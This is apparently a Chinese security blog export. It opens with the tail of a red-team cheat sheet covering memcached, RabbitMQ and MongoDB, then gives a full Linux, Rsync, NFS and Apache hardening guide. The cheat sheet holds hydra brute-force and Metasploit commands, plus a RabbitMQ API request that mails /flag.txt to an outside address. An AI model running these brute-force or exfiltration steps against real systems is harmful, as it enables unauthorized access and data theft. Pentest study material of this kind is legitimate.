<h4 id="自动化-1"><a href="#自动化-1" class="headerlink" title="自动化"></a>自动化</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -n -sV --script memcached-info -p 11211 &lt;IP&gt;    #Just gather info</span><br><span class="line">msf &gt; use auxiliary/gather/memcached_extractor       #Extracts saved data</span><br><span class="line">msf &gt; use auxiliary/scanner/memcached/memcached_amp  #Check is UDP DDoS amplification attack is possible </span><br></pre></td></tr></table></figure>
<h3 id="15672-RabbitMQ-Management"><a href="#15672-RabbitMQ-Management" class="headerlink" title="15672-RabbitMQ Management"></a>15672-RabbitMQ Management</h3><h4 id="启动插件"><a href="#启动插件" class="headerlink" title="启动插件"></a>启动插件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rabbitmq-plugins enable rabbitmq_management</span><br><span class="line">service rabbitmq-server restart</span><br></pre></td></tr></table></figure>
<h4 id="暴力破解-17"><a href="#暴力破解-17" class="headerlink" title="暴力破解"></a>暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form &quot;/path/index.php:name=^USER^&amp;password=^PASS^&amp;enter=Sign+in:Login name or password is incorrect&quot; -V</span><br><span class="line"># Use https-post-form mode for httpS</span><br></pre></td></tr></table></figure>
<h4 id="API使用"><a href="#API使用" class="headerlink" title="API使用"></a>API使用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）API信息</span><br><span class="line"></span><br><span class="line">http://localhost:15672/api/connections</span><br><span class="line"></span><br><span class="line">2）使用API发布信息</span><br><span class="line"></span><br><span class="line">POST /api/exchanges/%2F/amq.default/publish HTTP/1.1</span><br><span class="line">Host: 172.32.56.72:15672</span><br><span class="line">Authorization: Basic dGVzdDp0ZXN0</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Content-Length: 267</span><br><span class="line"></span><br><span class="line">&#123;&quot;vhost&quot;:&quot;/&quot;,&quot;name&quot;:&quot;amq.default&quot;,&quot;properties&quot;:&#123;&quot;delivery_mode&quot;:1,&quot;headers&quot;:&#123;&#125;&#125;,&quot;routing_key&quot;:&quot;email&quot;,&quot;delivery_mode&quot;:&quot;1&quot;,&quot;payload&quot;:&quot;&#123;\&quot;to\&quot;:\&quot;zevtnax+ppp@gmail.com\&quot;, \&quot;attachments\&quot;: [&#123;\&quot;path\&quot;: \&quot;/flag.txt\&quot;&#125;]&#125;&quot;,&quot;headers&quot;:&#123;&#125;,&quot;props&quot;:&#123;&#125;,&quot;payload_encoding&quot;:&quot;string&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>refer: <a href="https://book.hacktricks.xyz/pentesting/15672-pentesting-rabbitmq-management">https://book.hacktricks.xyz/pentesting/15672-pentesting-rabbitmq-management</a></p>
<h3 id="27017-x2F-27018-MongoDB"><a href="#27017-x2F-27018-MongoDB" class="headerlink" title="27017&#x2F;27018: MongoDB"></a>27017&#x2F;27018: MongoDB</h3><h4 id="自动枚举-1"><a href="#自动枚举-1" class="headerlink" title="自动枚举"></a>自动枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV --script &quot;mongo* and default&quot; -p 27017 &lt;IP&gt;   #By default all the nmap mongo enumerate scripts are used</span><br></pre></td></tr></table></figure>
<h4 id="手动枚举"><a href="#手动枚举" class="headerlink" title="手动枚举"></a>手动枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pymongo import MongoClient</span><br><span class="line">client = MongoClient(host, port, username=username, password=password)</span><br><span class="line">client.server_info() #Basic info</span><br><span class="line">#If you have admin access you can obtain more info</span><br><span class="line">admin = client.admin</span><br><span class="line">admin_info = admin.command(&quot;serverStatus&quot;)</span><br><span class="line">cursor = client.list_databases()</span><br><span class="line">for db in cursor:</span><br><span class="line">    print(db)</span><br><span class="line">    print(client[db[&quot;name&quot;]].list_collection_names())</span><br><span class="line">#If admin access, you could dump the database also</span><br></pre></td></tr></table></figure>
<h4 id="连接登录"><a href="#连接登录" class="headerlink" title="连接登录"></a>连接登录</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mongo &lt;HOST&gt;</span><br><span class="line">mongo &lt;HOST&gt;:&lt;PORT&gt;</span><br><span class="line">mongo &lt;HOST&gt;:&lt;PORT&gt;/&lt;DB&gt;</span><br><span class="line">mongo &lt;database&gt; -u &lt;username&gt; -p &#x27;&lt;password&gt;&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="暴力破解-18"><a href="#暴力破解-18" class="headerlink" title="暴力破解"></a>暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV --script mongodb-brute -n -p 27017 &lt;IP&gt;</span><br><span class="line">use auxiliary/scanner/mongodb/mongodb_login</span><br></pre></td></tr></table></figure>
<p>refer: <a href="https://book.hacktricks.xyz/pentesting/27017-27018-mongodb">https://book.hacktricks.xyz/pentesting/27017-27018-mongodb</a></p>
<hr>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
<li><a href="https://book.hacktricks.xyz/pentesting">https://book.hacktricks.xyz/pentesting</a></li>
<li><a href="https://book.hacktricks.xyz/brute-force">https://book.hacktricks.xyz/brute-force</a></li>
<li><a href="https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml">https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml</a></li>
<li><a href="https://zh.wikipedia.org/wiki/TCP/UDP%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8">https://zh.wikipedia.org/wiki/TCP/UDP%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting/pentesting-web">https://book.hacktricks.xyz/pentesting/pentesting-web</a></li>
</ul>
]]></content>
      <categories>
        <category>红队渗透</category>
      </categories>
      <tags>
        <tag>Execution</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux加固手册</title>
    <url>/posts/98821/</url>
    <content><![CDATA[<center>本文总结Linux系统及服务组件安全加固方法...</center>

<span id="more"></span>

<h2 id="0x01-Linux-系统加固"><a href="#0x01-Linux-系统加固" class="headerlink" title="0x01 Linux 系统加固"></a>0x01 Linux 系统加固</h2><h3 id="1-账号和口令"><a href="#1-账号和口令" class="headerlink" title="1. 账号和口令"></a>1. 账号和口令</h3><h4 id="1-1-禁用或删除无用账号"><a href="#1-1-禁用或删除无用账号" class="headerlink" title="1.1 禁用或删除无用账号"></a>1.1 禁用或删除无用账号</h4><p>减少系统无用账号，降低安全风险</p>
<p><strong>操作步骤</strong></p>
<ul>
<li>使用命令 <code>userdel &lt;用户名&gt;</code> 删除不必要的账号</li>
<li>使用命令 <code>passwd -l &lt;用户名&gt;</code> 锁定不必要的账号</li>
<li>使用命令 <code>passwd -u &lt;用户名&gt;</code> 解锁必要的账号</li>
</ul>
<h4 id="1-2-检查特殊账号"><a href="#1-2-检查特殊账号" class="headerlink" title="1.2 检查特殊账号"></a>1.2 检查特殊账号</h4><p>检查是否存在空口令和root权限的账号</p>
<p><strong>操作步骤</strong>    </p>
<ol>
<li>查看空口令和root权限账号，确认是否存在异常账号：</li>
</ol>
<ul>
<li>使用命令 <code>awk -F: &#39;($2==&quot;&quot;)&#39; /etc/shadow</code> 查看空口令账号</li>
<li>使用命令 <code>awk -F: &#39;($3==0)&#39; /etc/passwd</code> 查看UID为零的账号</li>
</ul>
<ol start="2">
<li>加固空口令账号：</li>
</ol>
<ul>
<li>使用命令 <code>passwd &lt;用户名&gt; </code>为空口令账号设定密码</li>
<li>确认UID为零的账号只有root账号</li>
</ul>
<h4 id="1-3-添加口令策略"><a href="#1-3-添加口令策略" class="headerlink" title="1.3 添加口令策略"></a>1.3 添加口令策略</h4><pre><code>加强口令的复杂度等，降低被猜解的可能性
</code></pre>
<p><strong>操作步骤</strong></p>
<ol>
<li><p>使用命令 <code>vi /etc/login.defs </code>修改配置文件</p>
<pre><code> PASS_MAX_DAYS 90     #新建用户的密码最长使用天数
 PASS_MIN_DAYS 0       #新建用户的密码最短使用天数
 PASS_WARN_AGE 7     #新建用户的密码到期提前提醒天数
</code></pre>
</li>
<li><p>使用chage命令修改用户设置</p>
<pre><code> chage -m 0 -M 30 -E 2000-01-01 -W 7 &lt;用户名&gt;
</code></pre>
<p> 表示将此用户的密码最长使用天数设为30，最短使用天数设为0，密码2000年1月1日过期，过期前七天警告用户</p>
</li>
<li><p>设置连续输错三次密码，账号锁定五分钟</p>
<p> 使用命令 <code>vi /etc/pam.d/common-auth</code>修改配置文件，在配置文件中添加 <code>auth required pam_tally.so onerr=fail deny=3 unlock_time=300</code></p>
</li>
</ol>
<h4 id="1-4-限制用户su"><a href="#1-4-限制用户su" class="headerlink" title="1.4 限制用户su"></a>1.4 限制用户su</h4><pre><code>限制能su到root的用户
</code></pre>
<p><strong>操作步骤</strong></p>
<p>使用命令 <code>vi /etc/pam.d/su</code>修改配置文件，在配置文件中添加行</p>
<p>只允许test组用户su到root，则添加<code>auth required pam_wheel.so group=test</code></p>
<h4 id="1-5-禁止root用户直接登录"><a href="#1-5-禁止root用户直接登录" class="headerlink" title="1.5 禁止root用户直接登录"></a>1.5 禁止root用户直接登录</h4><pre><code>限制root用户直接登录
</code></pre>
<p><strong>操作步骤</strong></p>
<ol>
<li>创建普通权限账号并配置密码,防止无法远程登录;</li>
<li>使用命令 <code>vi /etc/ssh/sshd_config</code>修改配置文件将PermitRootLogin的值改成no，并保存，然后使用<code>service sshd restart</code>重启服务</li>
</ol>
<h3 id="2-服务加固"><a href="#2-服务加固" class="headerlink" title="2. 服务加固"></a>2. 服务加固</h3><h4 id="2-1-关闭不必要的服务"><a href="#2-1-关闭不必要的服务" class="headerlink" title="2.1 关闭不必要的服务"></a>2.1 关闭不必要的服务</h4><pre><code>关闭不必要的服务(如普通服务和xinetd服务)，降低风险
</code></pre>
<p><strong>操作步骤</strong></p>
<p>使用命令<code>systemctl disable &lt;服务名&gt;</code>设置服务在开机时不自动启动</p>
<p>CentOS 6可以使用命令<code>chkconfig --level &lt;init级别&gt; &lt;服务名&gt; off</code>设置服务在指定init级别下开机时不自动启动。</p>
<h4 id="2-2-SSH服务安全"><a href="#2-2-SSH服务安全" class="headerlink" title="2.2 SSH服务安全"></a>2.2 SSH服务安全</h4><pre><code>对SSH服务进行安全加固，防止暴力破解成功
</code></pre>
<p><strong>操作步骤</strong></p>
<p>使用命令 <code>vim /etc/ssh/sshd_config </code>编辑配置文件</p>
<pre><code>  1. 不允许root账号直接登录系统: 设置 PermitRootLogin 的值为 no
  2. 修改SSH使用的协议版本: 设置 Protocol 的版本为 2
  3. 修改允许密码错误次数（默认6次）: 设置 MaxAuthTries 的值为 3
  配置文件修改完成后，重启sshd服务生效。
</code></pre>
<h3 id="3-文件系统"><a href="#3-文件系统" class="headerlink" title="3. 文件系统"></a>3. 文件系统</h3><h4 id="3-1-设置umask值"><a href="#3-1-设置umask值" class="headerlink" title="3.1 设置umask值"></a>3.1 设置umask值</h4><pre><code>设置默认的umask值，增强安全性
</code></pre>
<p><strong>操作步骤</strong></p>
<p>使用命令 <code>vi /etc/profile</code> 修改配置文件，添加行 <code>umask 027</code>， 即新创建的文件属主拥有读写执行权限，同组用户拥有读和执行权限，其他用户无权限。</p>
<h4 id="3-2-设置登录超时"><a href="#3-2-设置登录超时" class="headerlink" title="3.2 设置登录超时"></a>3.2 设置登录超时</h4><p>设置系统登录后，连接超时时间，增强安全性</p>
<p><strong>操作步骤</strong></p>
<p>使用命令 <code>vi /etc/profile</code> 修改配置文件，将以 <code>TMOUT= </code>开头的行注释，设置为<code>TMOUT=180</code>，即超时时间为三分钟</p>
<h3 id="4-日志"><a href="#4-日志" class="headerlink" title="4. 日志"></a>4. 日志</h3><h4 id="4-1-syslogd日志"><a href="#4-1-syslogd日志" class="headerlink" title="4.1 syslogd日志"></a>4.1 syslogd日志</h4><p>启用日志功能，并配置日志记录</p>
<p><strong>操作步骤</strong></p>
<p>Linux系统默认启用以下类型日志：</p>
<pre><code>系统日志（默认）/var/log/messages
cron日志（默认）/var/log/cron
安全日志（默认）/var/log/secure
注意：部分系统可能使用`syslog-ng`日志，配置文件为：`/etc/syslog-ng/syslog-ng.conf`
</code></pre>
<h4 id="4-2-登录和操作日志"><a href="#4-2-登录和操作日志" class="headerlink" title="4.2 登录和操作日志"></a>4.2 登录和操作日志</h4><p>通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查</p>
<p><strong>操作步骤</strong></p>
<p>运行 <code>[root@xxx /]# vim /etc/profile</code>打开配置文件</p>
<p>在配置文件中输入以下内容：</p>
<pre><code>history
USER=`whoami`
USER_IP=`who -u am i 2&gt;/dev/null| awk &#39;&#123;print $NF&#125;&#39;|sed -e &#39;s/[()]//g&#39;`
if [ &quot;$USER_IP&quot; = &quot;&quot; ]; then
USER_IP=`hostname`
fi
if [ ! -d /var/log/history ]; then
mkdir /var/log/history
chmod 777 /var/log/history
fi
if [ ! -d /var/log/history/$&#123;LOGNAME&#125; ]; then
mkdir /var/log/history/$&#123;LOGNAME&#125;
chmod 300 /var/log/history/$&#123;LOGNAME&#125;
fi
export HISTSIZE=4096
DT=`date +&quot;%Y%m%d_%H:%M:%S&quot;`
export HISTFILE=&quot;/var/log/history/$&#123;LOGNAME&#125;/$&#123;USER&#125;@$&#123;USER_IP&#125;_$DT&quot;
chmod 600 /var/log/history/$&#123;LOGNAME&#125;/*history* 2&gt;/dev/null
</code></pre>
<p>运行<code> [root@xxx /]# source /etc/profile</code> 加载配置生效</p>
<p>注意： <code>/var/log/history</code> 是记录日志的存放位置，可以自定义</p>
<p>通过上述步骤，可以在<code>/var/log/history</code>目录下以每个用户为名新建一个文件夹，每次用户退出后都会产生以用户名、登录IP、时间的日志文件，包含此用户本次的所有操作（root用户除外）</p>
<h2 id="0x02-Rsync-服务安全加固"><a href="#0x02-Rsync-服务安全加固" class="headerlink" title="0x02 Rsync 服务安全加固"></a>0x02 Rsync 服务安全加固</h2><p>Rsync 是一个通过检查文件的时间戳和大小，来跨计算机系统高效地传输和同步文件的工具</p>
<p>通常情况下，管理程序在启动 Rsync 服务后，会直接运行传输任务。如果 Rsync 服务未经过安全加固，则很容易出现未授权访问等安全问题；其直接后果是传输数据裸露在互联网上，可以被任何人访问获取，带来严重的数据泄露风险</p>
<p>建议在使用 Rsync 服务端时，对 Rsync 服务进行安全加固，保障数据安全</p>
<h3 id="1-隐藏-module-信息"><a href="#1-隐藏-module-信息" class="headerlink" title="1. 隐藏 module 信息"></a>1. 隐藏 module 信息</h3><p>将配置文件修改为以下内容：</p>
<pre><code>list = false
</code></pre>
<h3 id="2-使用权限控制"><a href="#2-使用权限控制" class="headerlink" title="2. 使用权限控制"></a>2. 使用权限控制</h3><p>将不需要写入权限的 module 设置为只读：</p>
<pre><code>read only = true
</code></pre>
<h3 id="3-限制网络访问"><a href="#3-限制网络访问" class="headerlink" title="3. 限制网络访问"></a>3. 限制网络访问</h3><p>使用 安全组策略 或白名单，限制允许访问主机的 IP 地址</p>
<pre><code>hosts allow = 10.10.10.10
</code></pre>
<h3 id="4-启用账户认证"><a href="#4-启用账户认证" class="headerlink" title="4. 启用账户认证"></a>4. 启用账户认证</h3><p>只允许指定的用户，使用指定的密码，来调用 Rsync 服务</p>
<p><strong>服务端配置</strong></p>
<pre><code>auth users = ottocho
secrets file = /etc/rsyncd.secrets
</code></pre>
<p>在文件 <code>/etc/rsyncd.secrets</code> 中写入使用的账号密码(可自行选择)，格式为：<code>username:password</code>，支持多行</p>
<p>注意：密码要求满足强密码策略，必须是 8 位以上，且包括大小写字母、数字、特殊字符的字符串；此处的 password 使用明文</p>
<p><strong>客户端配置</strong></p>
<p>在客户端，使用<code> --password-file=/etc/rsyncd.secrets</code> 参数，在 <code>/etc/rsyncd.secrets </code>中写入密码</p>
<pre><code>Rsync -av --password-file=/etc/rsyncd.secrets test.host.com::files /des/path
</code></pre>
<p>在上述 &#x2F;etc&#x2F;rsyncd.secrets 密码文件中，用户或用户组必须和实际使用者保持一致，且权限必须是 600</p>
<h3 id="5-数据加密传输"><a href="#5-数据加密传输" class="headerlink" title="5. 数据加密传输"></a>5. 数据加密传输</h3><p>Rsync 默认不支持加密传输，如果需要使用 Rsync 传输重要性很高的数据，可以使用 SSH 模式</p>
<p>Rsync 支持以下两种同步模式：</p>
<ul>
<li>当源路径或目的路径的主机名后面包含一个冒号分隔符时，Rsync 使用 SSH 传输</li>
<li>当源路径或目的路径的主机名后面包含两个冒号，或使用 Rsync:&#x2F;&#x2F;URL 时，Rsync 使用 TCP 直接连接 Rsync daemon</li>
</ul>
<p>在配置好 SSH 后，推荐参照以下方式来使用：</p>
<pre><code>Rsync -av test.host.com:/path/to/files /des/path
</code></pre>
<h2 id="0x03-NFS-服务安全加固"><a href="#0x03-NFS-服务安全加固" class="headerlink" title="0x03  NFS 服务安全加固"></a>0x03  NFS 服务安全加固</h2><p>NFS（Network File System）是 FreeBSD 支持的一种文件系统，它允许网络中的计算机之间通过 TCP&#x2F;IP 网络共享资源。不正确的配置和使用 NFS，会带来安全问题</p>
<p><strong>缺陷总结</strong></p>
<p>NFS 的不安全性，主要体现于以下 4 个方面:</p>
<pre><code>1）缺少访问控制机制
2）没有真正的用户验证机制，只针对 RPC/Mount 请求进行过程验证
3）较早版本的 NFS 可以使未授权用户获得有效的文件句柄
4）在 RPC 远程调用中, SUID 程序具有超级用户权限
</code></pre>
<h3 id="1-配置共享目录（-x2F-etc-x2F-exports）"><a href="#1-配置共享目录（-x2F-etc-x2F-exports）" class="headerlink" title="1. 配置共享目录（&#x2F;etc&#x2F;exports）"></a>1. 配置共享目录（&#x2F;etc&#x2F;exports）</h3><p>使用 anonuid，anongid 配置共享目录，这样可以使挂载到 NFS 服务器的客户机仅具有最小权限。不要使用 no_root_squash</p>
<h3 id="2-使用网络访问控制"><a href="#2-使用网络访问控制" class="headerlink" title="2. 使用网络访问控制"></a>2. 使用网络访问控制</h3><p>使用 安全组策略 或 iptable 防火墙限制能够连接到 NFS 服务器的机器范围</p>
<pre><code>iptables -A INPUT -i eth0 -p TCP -s 172.16.0.0/12 --dport 111 -j ACCEPT
iptables -A INPUT -i eth0 -p UDP -s 172.16.0.0/12 --dport 111 -j ACCEPT
iptables -A INPUT -i eth0 -p TCP -s 10.0.0.0/8 --dport 111 -j ACCEPT
iptables -A INPUT -i eth0 -p UDP -s 10.0.0.0/8 --dport 111 -j ACCEPT
</code></pre>
<h3 id="3-账号验证"><a href="#3-账号验证" class="headerlink" title="3. 账号验证"></a>3. 账号验证</h3><p>使用 Kerberos V5 作为登录验证系统，要求所有访问人员使用账号登录，提高安全性</p>
<h3 id="4-设置-NFSD-的-COPY-数目"><a href="#4-设置-NFSD-的-COPY-数目" class="headerlink" title="4. 设置 NFSD 的 COPY 数目"></a>4. 设置 NFSD 的 COPY 数目</h3><p>在 Linux 中，NFSD 的 COPY 数目定义在启动文件 <code>/etc/rc.d/init.d/nfs</code> 中，默认值为 8</p>
<p>最佳的 COPY 数目一般取决于可能的客户机数目。可以通过测试来找到 COPY 数目的近似最佳值，并手动设置该参数</p>
<h3 id="5-选择传输协议"><a href="#5-选择传输协议" class="headerlink" title="5. 选择传输协议"></a>5. 选择传输协议</h3><p>对于不同的网络情况，有针对地选择 UDP 或 TCP 传输协议。传输协议可以自动选择，也可以手动设置</p>
<pre><code>mount -t nfs -o sync,tcp,noatime,rsize=1024,wsize=1024 EXPORT_MACHINE:/EXPORTED_DIR /DIR
</code></pre>
<p>UDP 协议传输速度快，非连接传输时便捷，但其传输稳定性不如 TCP，当网络不稳定或者黑客入侵时很容易使 NFS 性能大幅降低，甚至导致网络瘫痪。一般情况下，使用 TCP 的 NFS 比较稳定，使用 UDP 的 NFS 速度较快</p>
<ul>
<li>在机器较少，网络状况较好的情况下，使用 UDP 协议能带来较好的性能。</li>
<li>当机器较多，网络情况复杂时，推荐使用 TCP 协议（V2 只支持 UDP 协议）。</li>
<li>在局域网中使用 UDP 协议较好，因为局域网有比较稳定的网络保证，使用 UDP 可以带来更好的性能</li>
<li>在广域网中推荐使用 TCP 协议，TCP 协议能让 NFS 在复杂的网络环境中保持最好的传输稳定性</li>
</ul>
<h3 id="6-限制客户机数量"><a href="#6-限制客户机数量" class="headerlink" title="6. 限制客户机数量"></a>6. 限制客户机数量</h3><p>修改 <code>/etc/hosts.allow</code> 和 <code>/etc/hosts.deny</code> 来限制客户机数量</p>
<pre><code>/etc/hosts.allow
portmap: 192.168.0.0/255.255.255.0 : allow
portmap: 140.116.44.125 : allow
/etc/hosts.deny
portmap: ALL : deny
</code></pre>
<h3 id="7-改变默认的-NFS-端口"><a href="#7-改变默认的-NFS-端口" class="headerlink" title="7. 改变默认的 NFS 端口"></a>7. 改变默认的 NFS 端口</h3><p>NFS 默认使用的是 111 端口，使用 port 参数可以改变这个端口值。改变默认端口值能够在一定程度上增强安全性</p>
<h3 id="8-配置-nosuid-和-noexec"><a href="#8-配置-nosuid-和-noexec" class="headerlink" title="8. 配置 nosuid 和 noexec"></a>8. 配置 nosuid 和 noexec</h3><p>SUID (Set User ID) 或 SGID (Set Group ID) 程序可以让普通用户以超过自己权限来执行。很多 SUID&#x2F;SGID 可执行程序是必须的，但也可能被一些恶意的本地用户利用，获取本不应有的权限</p>
<p>尽量减少所有者是 root，或是在 root 组中却拥有 SUID&#x2F;SGID 属性的文件。可以删除这样的文件或更改其属性，如：</p>
<ul>
<li><p>使用 nosuid 选项禁止 set-UID 程序在 NFS 服务器上运行，可以在 &#x2F;etc&#x2F;exports 加入一行：</p>
<pre><code>  /www www.abc.com(rw, root_squash, nosuid)
</code></pre>
</li>
<li><p>使用 noexec 禁止直接执行其中的二进制文件。</p>
</li>
</ul>
<h2 id="0x04-Apache-服务安全加固"><a href="#0x04-Apache-服务安全加固" class="headerlink" title="0x04 Apache 服务安全加固"></a>0x04 Apache 服务安全加固</h2><h3 id="1-用户设置"><a href="#1-用户设置" class="headerlink" title="1. 用户设置"></a>1. 用户设置</h3><p><strong>1. 以专门的用户帐号和用户组运行 Apache 服务</strong></p>
<p>根据需要，为 Apache 服务创建用户及用户组。如果没有设置用户和组，则新建用户，并在 Apache 配置文件中进行指定。</p>
<p>1）创建 Apache 用户组。</p>
<pre><code>groupadd apache
</code></pre>
<p>2）创建 Apache 用户并加入 Apache 用户组。</p>
<pre><code>useradd apache –g apache
</code></pre>
<p>3）将下面两行设置参数加入 Apache 配置文件 httpd.conf 中：</p>
<pre><code>User apache    Group apache
</code></pre>
<p><strong>2. 检查 httpd.conf 配置文件中是否允许使用非专用账户（如 root 用户）运行 Apache 服务</strong></p>
<p>默认设置一般即符合要求。Linux 系统中默认使用 apache 或者 nobody 用户，Unix 系统默认使用 daemon 用户</p>
<h3 id="2-授权设置"><a href="#2-授权设置" class="headerlink" title="2. 授权设置"></a>2. 授权设置</h3><p><strong>1. 严格控制 Apache 主目录的访问权限，非超级用户不能修改该目录中的内容</strong></p>
<p>Apache 的主目录对应于 Apache Server配置文件 httpd.conf 中的 Server Root 控制项，应设置为：</p>
<pre><code>Server Root /usr/local/apache
</code></pre>
<ul>
<li>判定条件： 非超级用户不能修改该目录中的内容。</li>
<li>检测操作： 尝试进行修改，看是否能修改该目录中的内容。</li>
</ul>
<p>该目录一般设置为 &#x2F;etc&#x2F;httpd 目录，默认情况下属主为 root 用户，其它用户不能修改该目录中的文件。默认设置一般即符合要求。</p>
<p><strong>2. 严格设置配置文件和日志文件的权限，防止未授权访问</strong></p>
<ul>
<li>执行<code>chmod 600 /etc/httpd/conf/httpd.conf</code>命令设置配置文件为属主可读写，其他用户无读写权限。</li>
<li>执行<code>chmod 644 /var/log/httpd/.log</code>命令设置日志文件为属主可读写，其他用户拥有只读权限。</li>
</ul>
<p>注意：<code>/etc/httpd/conf/httpd.conf </code>配置文件的默认权限是644，可根据需要修改权限为600。  <code>/var/log/httpd/.log </code>日志文件的默认权限为644，默认设置即符合要求。</p>
<h3 id="3-日志设置"><a href="#3-日志设置" class="headerlink" title="3. 日志设置"></a>3. 日志设置</h3><p>Apache 设备应配置日志功能，对运行错误、用户访问等事件进行记录，记录内容包括时间，用户使用的 IP 地址等内容。</p>
<p>修改 httpd.conf 配置文件，设置日志记录文件、记录内容、记录格式。</p>
<p><strong>错误日志：</strong></p>
<pre><code>LogLevel notice #日志的级别    ErrorLog /…/logs/error_log #日志的保存位置(错误日志)
</code></pre>
<p><strong>访问日志：</strong></p>
<pre><code>LogFormat %h %l %u %t \”%r\” %&gt;s %b “%&#123;Accept&#125;i\”%&#123;Referer&#125;i\” \”%&#123;User-Agent&#125;i\””    combined    CustomLog /…/logs/access_log combined (访问日志)
</code></pre>
<p><strong>注意：</strong></p>
<ul>
<li><code>ErrorLog</code>指令设置错误日志文件名和位置。错误日志是最重要的日志文件。Apache httpd 程序将在这个文件中存放诊断信息和处理请求中出现的错误。若要将错误日志传送到 Syslog，则执行ErrorLog syslog命令。</li>
<li><code>CustomLog</code>指令指定了保存日志文件的具体位置以及日志的格式。访问日志中会记录服务器所处理的所有请求。</li>
<li><code>LogFormat</code>命令用于设置日志格式，建议设置为 combined 格式。</li>
<li><code>LogLevel</code>命令用于调整记录在错误日志中的信息的详细程度，建议设置为 notice。日志的级别，默认是 warn 级别，notice 级别比较详细，但在实际中由于日志会占用大量硬盘空间。</li>
</ul>
<h3 id="4-禁止访问外部文件"><a href="#4-禁止访问外部文件" class="headerlink" title="4. 禁止访问外部文件"></a>4. 禁止访问外部文件</h3><p><code>禁止 Apache 访问 Web 目录之外的任何文件</code></p>
<p><strong>1. 修改 httpd.conf 配置文件</strong></p>
<pre><code>Order Deny,Allow    Deny from all
</code></pre>
<p><strong>2. 设置可访问的目录</strong></p>
<pre><code>Order Allow,Deny    Allow from /web
</code></pre>
<p>说明： 其中 &#x2F;web 为网站根目录</p>
<p><strong>3. 默认配置如下，可根据业务需要进行设置</strong></p>
<pre><code>Options FollowSymLinks    AllowOverride None
</code></pre>
<h3 id="5-禁止目录浏览"><a href="#5-禁止目录浏览" class="headerlink" title="5. 禁止目录浏览"></a>5. 禁止目录浏览</h3><p>目录浏览会导致明显信息泄露或下载，建议禁止 Apache 列表显示文件。在 &#x2F;etc&#x2F;httpd&#x2F;httpd.conf 配置文件中删除 Options 的 Indexes 设置即可</p>
<p><strong>1. 修改 httpd.conf 配置文件</strong></p>
<pre><code>#Options Indexes FollowSymLinks #删掉Indexes    Options FollowSymLinks    AllowOverride None    Order allow,deny    Allow from all
</code></pre>
<p>将Options Indexes FollowSymLinks中的Indexes去掉，就可以禁止 Apache 显示该目录结构。Indexes的作用就是当该目录下没有 index.html 文件时，自动显示目录结构</p>
<p><strong>2. 重新启动 Apache 服务</strong></p>
<h3 id="6-错误页面重定向"><a href="#6-错误页面重定向" class="headerlink" title="6. 错误页面重定向"></a>6. 错误页面重定向</h3><p>Apache 错误页面重定向功能可以防止敏感信息泄露。</p>
<p><strong>1. 修改 httpd.conf 配置文件</strong></p>
<pre><code>ErrorDocument 400 /custom400.html    ErrorDocument 401 /custom401.html    ErrorDocument 403 /custom403.html    ErrorDocument 404 /custom404.html    ErrorDocument 405 /custom405.html    ErrorDocument 500 /custom500.html
</code></pre>
<p>注意： Customxxx.html 为要设置的错误页面</p>
<p><strong>2. 重新启动 Apache 服务</strong></p>
<p>注意： 此项配置需要应用系统设有错误页面，或者不在 httpd 中设置，而完全由业务逻辑实现</p>
<h3 id="7-拒绝服务防范"><a href="#7-拒绝服务防范" class="headerlink" title="7. 拒绝服务防范"></a>7. 拒绝服务防范</h3><p>根据业务需要，合理设置 session 时间，防止拒绝服务攻击</p>
<p><strong>1. 修改 httpd.conf 配置文件</strong></p>
<p>Timeout 10 #客户端与服务器端建立连接前的时间间隔    KeepAlive On    KeepAliveTimeout 15 #限制每个 session 的保持时间是 15 秒。此处为建议值，具体的参数值需要根据现实际情况设定</p>
<p><strong>2. 重新启动 Apache 服务</strong></p>
<p>注意： 默认值为Timeout 120，KeepAlive Off，KeepAliveTimeout 15，该项设置涉及性能调整</p>
<h3 id="8-隐藏-Apache-版本号"><a href="#8-隐藏-Apache-版本号" class="headerlink" title="8. 隐藏 Apache 版本号"></a>8. 隐藏 Apache 版本号</h3><p>隐藏 Apache 的版本号及其它敏感信息</p>
<p><strong>1. 修改 httpd.conf 配置文件：</strong></p>
<pre><code>ServerSignature Off ServerTokens Prod
</code></pre>
<h3 id="9-关闭-TRACE功能"><a href="#9-关闭-TRACE功能" class="headerlink" title="9. 关闭 TRACE功能"></a>9. 关闭 TRACE功能</h3><p>关闭 TRACE 功能，防止 TRACE 方法被访问者恶意利用。</p>
<p>在 &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf 配置文件中添加以下设置参数：</p>
<pre><code>TraceEnable Off
</code></pre>
<p>注意： 该参数适用于 Apache 2.0 以上版本</p>
<h3 id="10-禁用-CGI"><a href="#10-禁用-CGI" class="headerlink" title="10. 禁用 CGI"></a>10. 禁用 CGI</h3><p>如果服务器上不需要运行 CGI 程序，建议禁用 CGI</p>
<p>如果没有CGI程序，可以修改 &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf 配置文件，把 cgi-bin 目录的配置和模块都进行注释。</p>
<pre><code>#LoadModule cgi_module modules/mod_cgi.so#ScriptAlias /cgi-bin/ “/var/www/cgi-bin/##AllowOverride None# Options None#Order allow,deny#Allow from all#
</code></pre>
